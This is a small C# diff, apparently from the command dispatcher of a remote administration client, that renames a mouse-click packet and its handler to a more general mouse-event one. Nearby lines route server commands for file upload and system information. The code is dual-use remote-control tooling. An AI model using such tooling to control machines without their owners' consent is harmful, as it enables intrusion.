@@ -67,9 +67,9 @@ namespace xClient.Core.Packets
             {
                 CommandHandler.HandleDoUploadFile((ServerPackets.DoUploadFile)packet, client);
             }
-            else if (type == typeof(ServerPackets.DoMouseClick))
+            else if (type == typeof(ServerPackets.DoMouseEvent))
             {
-                CommandHandler.HandleDoMouseClick((ServerPackets.DoMouseClick)packet, client);
+                CommandHandler.HandleDoMouseEvent((ServerPackets.DoMouseEvent)packet, client);
             }
             else if (type == typeof(ServerPackets.GetSystemInfo))
             {
